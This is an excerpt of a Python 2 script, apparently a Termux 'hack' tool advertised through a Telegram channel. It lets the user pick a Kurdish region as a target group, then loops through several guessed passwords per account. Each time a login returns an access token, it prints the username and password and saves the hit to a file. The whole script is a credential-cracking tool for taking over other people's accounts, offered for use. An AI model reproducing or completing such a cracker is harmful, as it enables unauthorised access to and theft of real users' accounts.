...
\033[1;94mMy Telegram : \033[1;91@HACKFREETERMOX430

\033[1;94mMy Chanell  : \033[1;92 @HACKFREETERMOX
...
def menu():
    ...
    print logo
    print 42 * '\x1b[1;91m='
    print '\x1b[1;94m[1]\x1b[1;92m KURDISTAN HULER SLIMANE DHOK KARKUK] '
    print 42 * '\x1b[1;91m='
    action()
    ...
    def main(arg):
        ...
        try:
            ...
            if 'access_token' in q:
                print '\x1b[1;92m[GOOD]\x1b[1;92m ' + k + c + user + ' >>> ' + pass1 + '\n' + '\n'
            ...
            q = json.load(data)
            if 'access_token' in q:
                print '\x1b[1;92m[GOOD]\x1b[1;92m ' + k + c + user + ' >>> ' + pass2 + '\n' + '\n'
                okb = open('save/successfull.txt', 'a')
            ...
            q = json.load(data)
            if 'access_token' in q:
                print '\x1b[1;92m[GOOD]\x1b[1;92m ' + k + c + user + ' >>> ' + pass3 + '\n' + '\n'
                okb = open('save/successfull.txt', 'a')
            ...
            q = json.load(data)
            if 'access_token' in q:
                print '\x1b[1;92m[GOOD]\x1b[1;92m ' + k + c + user + ' >>> ' + pass4 + '\n' + '\n'
                okb = open('save/successfull.txt', 'a')
            ...
            q = json.load(data)
            if 'access_token' in q:
                print '\x1b[1;92m[GOOD]\x1b[1;92m ' + k + c + user + ' >>> ' + pass5 + '\n' + '\n'
                okb = open('save/successfull.txt', 'a')
